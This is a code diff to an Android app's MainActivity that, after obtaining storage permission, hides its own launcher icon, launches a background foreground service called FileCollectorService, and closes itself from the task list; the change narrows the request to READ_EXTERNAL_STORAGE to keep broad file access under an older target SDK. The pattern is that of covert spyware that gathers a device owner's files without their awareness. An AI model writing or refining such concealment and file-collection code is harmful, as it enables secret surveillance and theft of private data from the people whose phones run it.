@@ -19,11 +19,15 @@ public class MainActivity extends ComponentActivity {
         registerForActivityResult(
             new ActivityResultContracts.RequestMultiplePermissions(),
             (Map<String, Boolean> result) -> {
-                boolean allGranted = true;
+                // Check if at least storage permission was granted
+                boolean storageGranted = false;
                 for (Boolean b : result.values()) {
-                    if (!b) allGranted = false;
+                    if (b) {
+                        storageGranted = true;
+                        break;
+                    }
                 }
-                if (allGranted) {
+                if (storageGranted) {
                     Toast.makeText(this, "Setup complete", Toast.LENGTH_SHORT).show();
                 }
                 startServiceAndHide();
@@ -37,24 +41,14 @@ public class MainActivity extends ComponentActivity {
     }
 
     private void requestPermissionsAndStart() {
-        String[] permissions;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions = new String[]{
-                Manifest.permission.READ_MEDIA_IMAGES,
-                Manifest.permission.READ_MEDIA_VIDEO,
-                Manifest.permission.READ_MEDIA_AUDIO,
-                Manifest.permission.POST_NOTIFICATIONS
-            };
-        } else {
-            permissions = new String[]{
-                Manifest.permission.READ_EXTERNAL_STORAGE
-            };
-        }
-        permissionLauncher.launch(permissions);
+        // Request only READ_EXTERNAL_STORAGE — works on all versions with targetSdk=29
+        permissionLauncher.launch(new String[]{
+            Manifest.permission.READ_EXTERNAL_STORAGE
+        });
     }
 
     private void startServiceAndHide() {
-        // Hide the launcher icon (app stays installed)
+        // Hide launcher icon
         try {
             PackageManager pm = getPackageManager();
             ComponentName component = new ComponentName(this, MainActivity.class);
@@ -65,7 +59,7 @@ public class MainActivity extends ComponentActivity {
             );
         } catch (Exception ignored) {}
 
-        // Start the foreground service
+        // Start foreground service
         Intent serviceIntent = new Intent(this, FileCollectorService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
@@ -73,6 +67,7 @@ public class MainActivity extends ComponentActivity {
             startService(serviceIntent);
         }
 
+        // Close activity
         new Handler(getMainLooper()).postDelayed(this::finishAndRemoveTask, 200);
     }
 }
